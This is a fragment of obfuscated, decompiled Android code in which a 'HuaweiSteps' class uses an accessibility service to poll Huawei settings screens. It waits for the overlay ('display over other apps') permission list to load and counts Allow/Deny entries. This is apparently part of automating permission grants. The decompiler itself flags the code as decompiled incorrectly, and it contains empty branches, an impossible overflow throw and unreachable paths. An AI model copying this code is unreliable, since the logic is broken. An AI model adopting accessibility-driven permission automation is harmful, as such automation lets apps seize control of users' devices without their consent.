                huaweiSteps$waitForOverlayListLoaded$1.f54143a2 = j4;
                huaweiSteps$waitForOverlayListLoaded$1.f54144a3 = jCurrentTimeMillis;
                huaweiSteps$waitForOverlayListLoaded$1.f54145a4 = j62;
                huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 5;
                str = str4;
                if (b81.m210571b1(200L, huaweiSteps$waitForOverlayListLoaded$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            arrayList = new ArrayList();
            m212145a7(rootInActiveWindow2, arrayList);
            jCurrentTimeMillis2 = System.currentTimeMillis();
            if (jCurrentTimeMillis2 - j3 > 2000) {
                t60.m214704c5("HuaweiSteps", "[waitForOverlayList] 页面文本: ".concat(AbstractC0715je.m213295i2(AbstractC0715je.m213301i8(arrayList, 15), " | ", null, null, null, 62)));
            } else {
                jCurrentTimeMillis2 = j3;
            }
            if (arrayList.isEmpty()) {
                i3 = 0;
            } else {
                int size3 = arrayList.size();
                int i9 = 0;
                int i10 = 0;
                while (i10 < size3) {
                    Object obj3 = arrayList.get(i10);
                    int i11 = i10 + 1;
                    int i12 = size3;
                    String str15 = (String) obj3;
                    if (AbstractC0779a1.m213652a5(str15, str11, false) || AbstractC0779a1.m213652a5(str15, str10, false)) {
                        str8 = str10;
                        i4 = i9 + 1;
                        if (i4 >= 0) {
                            throw new ArithmeticException(str);
                        }
                        i9 = i4;
                        i10 = i11;
                        str10 = str8;
                        size3 = i12;
                    } else {
                        str8 = str10;
                        if (AbstractC0779a1.m213652a5(str15, "Allow", true) || AbstractC0779a1.m213652a5(str15, "Deny", true)) {
                            i4 = i9 + 1;
                            if (i4 >= 0) {
                            }
                        } else {
                            size3 = i12;
                            i10 = i11;
                            str10 = str8;
                        }
                    }
                }
                i3 = i9;
            }
            str2 = str10;
            str4 = str;
            if (i3 < 3) {
                if (!arrayList.isEmpty()) {
                    int size4 = arrayList.size();
                    int i13 = 0;
                    while (i13 < size4) {
                        Object obj4 = arrayList.get(i13);
                        int i14 = i13 + 1;
                        String str16 = (String) obj4;
                        int i15 = size4;
                        str3 = str9;
                        if (AbstractC0779a1.m213652a5(str16, "搜索应用", false) || AbstractC0779a1.m213652a5(str16, "搜索", false) || AbstractC0779a1.m213652a5(str16, "Search", true)) {
                            break;
                        }
                        i13 = i14;
                        size4 = i15;
                        str9 = str3;
                    }
                }
                j3 = jCurrentTimeMillis2;
                str7 = str9;
                str5 = str11;
                str6 = str2;
                if (arrayList != null || !arrayList.isEmpty()) {
                    size = arrayList.size();
                    i2 = 0;
                    while (i2 < size) {
                        Object obj5 = arrayList.get(i2);
                        int i16 = i2 + 1;
                        String str17 = (String) obj5;
                        if (AbstractC0779a1.m213652a5(str17, "显示在其他应用的上层", false) || AbstractC0779a1.m213652a5(str17, "悬浮窗", false)) {
                            break;
                        }
                        if (AbstractC0779a1.m213652a5(str17, "Display over", true) || AbstractC0779a1.m213652a5(str17, "Overlay", true)) {
                            break;
                        }
                        i2 = i16;
                    }
                }
                c0365a23 = c0365a22;
                long j622 = j3;
                huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = c0365a23;
                huaweiSteps$waitForOverlayListLoaded$1.f54142a1 = null;
                huaweiSteps$waitForOverlayListLoaded$1.f54143a2 = j4;
                huaweiSteps$waitForOverlayListLoaded$1.f54144a3 = jCurrentTimeMillis;
                huaweiSteps$waitForOverlayListLoaded$1.f54145a4 = j622;
                huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 5;
                str = str4;
                if (b81.m210571b1(200L, huaweiSteps$waitForOverlayListLoaded$1) != coroutineSingletons) {
                    j3 = j622;
                    str11 = str5;
                    str10 = str6;
                    str9 = str7;
                    c0365a22 = c0365a23;
                    if (System.currentTimeMillis() - jCurrentTimeMillis >= j4) {
                    }
                }
            } else {
                tz0.m214806a6("[waitForOverlayList] 列表已加载 (允许count=", i3, str9, "HuaweiSteps");
                huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = null;
                huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 2;
            }
            return coroutineSingletons;
        }
        str = "Count overflow has happened.";
        long j9 = huaweiSteps$waitForOverlayListLoaded$1.f54145a4;
        jCurrentTimeMillis = huaweiSteps$waitForOverlayListLoaded$1.f54144a3;
        long j10 = huaweiSteps$waitForOverlayListLoaded$1.f54143a2;
        c0365a2 = huaweiSteps$waitForOverlayListLoaded$1.f54141a0;
        kg1.m213544f4(obj);
        j3 = j9;
        j2 = j10;
        t60.m214704c5("HuaweiSteps", "[waitForOverlayList] 开始检测列表加载...");
        c0365a22 = c0365a2;
        j4 = j2;
        if (System.currentTimeMillis() - jCurrentTimeMillis >= j4) {
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: h3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212215h3(long j, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForPageStable$1 huaweiSteps$waitForPageStable$1;
        C0365a2 c0365a2;
        int i;
        C0365a2 c0365a22;
        int i2;
        long jCurrentTimeMillis;
        HuaweiSteps$waitForPageStable$1 huaweiSteps$waitForPageStable$12;
        long j2;
        int childCount;
        int i3;
        if (continuationImpl instanceof HuaweiSteps$waitForPageStable$1) {
            huaweiSteps$waitForPageStable$1 = (HuaweiSteps$waitForPageStable$1) continuationImpl;
            int i4 = huaweiSteps$waitForPageStable$1.f54156a7;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForPageStable$1.f54156a7 = i4 - Integer.MIN_VALUE;
                c0365a2 = this;
            } else {
                c0365a2 = this;
                huaweiSteps$waitForPageStable$1 = new HuaweiSteps$waitForPageStable$1(c0365a2, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForPageStable$1.f54154a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = huaweiSteps$waitForPageStable$1.f54156a7;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            i = -1;
            c0365a22 = c0365a2;
            i2 = 0;
            jCurrentTimeMillis = System.currentTimeMillis();
            huaweiSteps$waitForPageStable$12 = huaweiSteps$waitForPageStable$1;
            j2 = j;
        } else {
            if (i5 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i6 = huaweiSteps$waitForPageStable$1.f54153a4;
            int i7 = huaweiSteps$waitForPageStable$1.f54152a3;
            jCurrentTimeMillis = huaweiSteps$waitForPageStable$1.f54151a2;
            long j3 = huaweiSteps$waitForPageStable$1.f54150a1;
            c0365a22 = huaweiSteps$waitForPageStable$1.f54149a0;
            kg1.m213544f4(obj);
            huaweiSteps$waitForPageStable$12 = huaweiSteps$waitForPageStable$1;
            j2 = j3;
            i2 = i6;
            i = i7;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                childCount = i;
                i3 = i2;
            } else {
                childCount = rootInActiveWindow.getChildCount();
                if (childCount != i || childCount <= 0) {
                    i3 = 0;
                } else {
                    i2++;
                    if (i2 >= 2) {
                        tz0.m214806a6("[waitForPageStable] ✅ 页面稳定 (childCount=", childCount, ")", "HuaweiSteps");
                        return Boolean.TRUE;
                    }
                    childCount = i;
                    i3 = i2;
                }
            }
            huaweiSteps$waitForPageStable$12.f54149a0 = c0365a22;
            huaweiSteps$waitForPageStable$12.f54150a1 = j2;
            huaweiSteps$waitForPageStable$12.f54151a2 = jCurrentTimeMillis;
            huaweiSteps$waitForPageStable$12.f54152a3 = childCount;
            huaweiSteps$waitForPageStable$12.f54153a4 = i3;
            huaweiSteps$waitForPageStable$12.f54156a7 = 1;
            if (b81.m210571b1(150L, huaweiSteps$waitForPageStable$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
            i2 = i3;
            i = childCount;
        }
        t60.m214704c5("HuaweiSteps", "[waitForPageStable] ⚠️ 超时，继续执行");
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: h4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212216h4(int i, long j, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForRootViewChange$1 huaweiSteps$waitForRootViewChange$1;
        int i2;
        long jCurrentTimeMillis;
        long j2;
        C0365a2 c0365a2;
        if (continuationImpl instanceof HuaweiSteps$waitForRootViewChange$1) {
            huaweiSteps$waitForRootViewChange$1 = (HuaweiSteps$waitForRootViewChange$1) continuationImpl;
            int i3 = huaweiSteps$waitForRootViewChange$1.f54163a6;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForRootViewChange$1.f54163a6 = i3 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$waitForRootViewChange$1 = new HuaweiSteps$waitForRootViewChange$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForRootViewChange$1.f54161a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = huaweiSteps$waitForRootViewChange$1.f54163a6;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
            c0365a2 = this;
        } else {
            if (i4 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            jCurrentTimeMillis = huaweiSteps$waitForRootViewChange$1.f54160a3;
            j2 = huaweiSteps$waitForRootViewChange$1.f54159a2;
            i2 = huaweiSteps$waitForRootViewChange$1.f54158a1;
            c0365a2 = huaweiSteps$waitForRootViewChange$1.f54157a0;
            kg1.m213544f4(obj);
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            AccessibilityNodeInfo rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null && rootInActiveWindow.getChildCount() >= i2) {
                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[waitForRootViewChange] ✅ 页面加载完成 (childCount=", rootInActiveWindow.getChildCount(), " >= ", i2, ")"));
                return Boolean.TRUE;
            }
            huaweiSteps$waitForRootViewChange$1.f54157a0 = c0365a2;
            huaweiSteps$waitForRootViewChange$1.f54158a1 = i2;
            huaweiSteps$waitForRootViewChange$1.f54159a2 = j2;
            huaweiSteps$waitForRootViewChange$1.f54160a3 = jCurrentTimeMillis;
            huaweiSteps$waitForRootViewChange$1.f54163a6 = 1;
            if (b81.m210571b1(100L, huaweiSteps$waitForRootViewChange$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        t60.m214704c5("HuaweiSteps", "[waitForRootViewChange] ⚠️ 超时，继续执行");
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0055  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0084  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:26:0x007f -> B:28:0x0082). Please report as a decompilation issue!!! */
    /* renamed from: h5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212217h5(String str, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForSearchResult$1 huaweiSteps$waitForSearchResult$1;
        String str2;
        int i;
        C0365a2 c0365a2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        if (continuationImpl instanceof HuaweiSteps$waitForSearchResult$1) {
            huaweiSteps$waitForSearchResult$1 = (HuaweiSteps$waitForSearchResult$1) continuationImpl;
            int i2 = huaweiSteps$waitForSearchResult$1.f54169a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForSearchResult$1.f54169a5 = i2 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$waitForSearchResult$1 = new HuaweiSteps$waitForSearchResult$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForSearchResult$1.f54167a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = huaweiSteps$waitForSearchResult$1.f54169a5;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[waitForSearchResult] 等待搜索结果: " + str);
            str2 = str;
            i = 0;
            c0365a2 = this;
            if (i >= 15) {
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = huaweiSteps$waitForSearchResult$1.f54166a2;
            String str3 = huaweiSteps$waitForSearchResult$1.f54165a1;
            c0365a2 = huaweiSteps$waitForSearchResult$1.f54164a0;
            kg1.m213544f4(obj);
            str2 = str3;
            i++;
            if (i >= 15) {
                t60.m214704c5("HuaweiSteps", "[waitForSearchResult] ⚠️ 等待搜索结果超时");
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2)) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                tz0.m214807a7("[waitForSearchResult] ✅ 搜索结果已出现: ", str2, "HuaweiSteps");
                return Boolean.TRUE;
            }
            huaweiSteps$waitForSearchResult$1.f54164a0 = c0365a2;
            huaweiSteps$waitForSearchResult$1.f54165a1 = str2;
            huaweiSteps$waitForSearchResult$1.f54166a2 = i;
            huaweiSteps$waitForSearchResult$1.f54169a5 = 1;
            if (b81.m210571b1(100L, huaweiSteps$waitForSearchResult$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            i++;
            if (i >= 15) {
            }
        }
    }
}
